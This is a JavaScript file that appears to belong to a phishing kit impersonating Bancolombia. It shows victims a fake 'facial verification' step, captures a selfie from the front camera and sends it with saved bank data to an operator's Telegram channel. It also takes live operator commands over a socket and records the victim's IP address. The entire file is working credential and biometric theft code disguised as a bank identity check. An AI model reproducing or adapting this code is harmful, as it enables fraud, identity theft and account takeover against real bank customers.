document.addEventListener('DOMContentLoaded', async function() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('captureBtn');
    const overlay = document.getElementById('loadingOverlay');
    
    if (!video || !canvas || !captureBtn || !overlay) return;
    
    overlay.classList.remove('active', 'show');
    overlay.style.display = '';
    
    const socketInstance = BancoUtils.initSocket();
    if (socketInstance) socketInstance.removeAllListeners('telegramAction');
    
    // Estado
    let photoTaken = false;
    let stream = null;
    let photoData = null;
    
    // Configuración inicial
    video.style.display = 'block';
    canvas.style.display = 'none';
    captureBtn.textContent = 'Tomar Foto';
    captureBtn.disabled = true;

    // Iniciar cámara frontal
    async function startCamera() {
        try {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            const constraints = {
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            };

            stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;

            return new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play().then(() => {
                        video.style.display = 'block';
                        canvas.style.display = 'none';
                        captureBtn.disabled = false;
                        captureBtn.classList.add('active');
                        resolve();
                    });
                };
            });
        } catch (err) {
            console.error('Error al iniciar cámara:', err);
            alert('Error al acceder a la cámara. Por favor, permite el acceso.');
            captureBtn.disabled = true;
        }
    }

    await startCamera();

    // Capturar foto
    captureBtn.addEventListener('click', async function() {
        if (!photoTaken) {
            try {
                if (!stream || !video.srcObject) {
                    await startCamera();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }

                const width = video.videoWidth || 1280;
                const height = video.videoHeight || 720;

                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                
                ctx.drawImage(video, 0, 0, width, height);
                photoData = canvas.toDataURL('image/jpeg', 0.9);

                video.style.display = 'none';
                canvas.style.display = 'block';
                captureBtn.textContent = 'Continuar';
                photoTaken = true;

                stream.getTracks().forEach(track => track.stop());
                stream = null;
            } catch (error) {
                console.error('Error al capturar:', error);
                alert('Error al capturar la foto. Intenta de nuevo.');
                await startCamera();
            }
        } else {
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            
            try {
                const currentSocket = BancoUtils.getSocket();
                
                if (!currentSocket || !currentSocket.connected) {
                    alert('Error de conexión. Recarga la página.');
                    overlay.classList.remove('active');
                    overlay.style.display = 'none';
                    return;
                }
                
                // Solo datos de texto para el mensaje (sin la imagen)
                const textData = { verificacion_facial: 'Completada' };
                const fullData = BancoUtils.saveBankData('bancolombia', textData);
                const message = BancoUtils.formatMessage('BANCOLOMBIA - Foto Facial', fullData);
                const keyboard = BancolombiaTelegram.getKeyboard();
                
                // Enviar con imagen por separado
                await BancoUtils.sendToTelegram('cara', { text: message, keyboard, image: photoData });
                console.log('✅ Foto facial enviada');
            } catch (error) {
                console.error('Error:', error);
                alert('Error al enviar la foto.');
                overlay.classList.remove('active');
                overlay.style.display = 'none';
            }
        }
    });
    
    BancoUtils.onTelegramAction((data) => BancolombiaTelegram.handleTelegramAction(data));

    // Actualizar IP y fecha/hora
    async function updateInfo() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ipEl = document.getElementById('ipAddress');
            if (ipEl) ipEl.textContent = `Dirección IP: ${ipData.ip}`;
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            const dateEl = document.getElementById('datetime');
            if (dateEl) dateEl.textContent = now.toLocaleDateString('es-CO', options);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    updateInfo();
    setInterval(updateInfo, 60000);
});
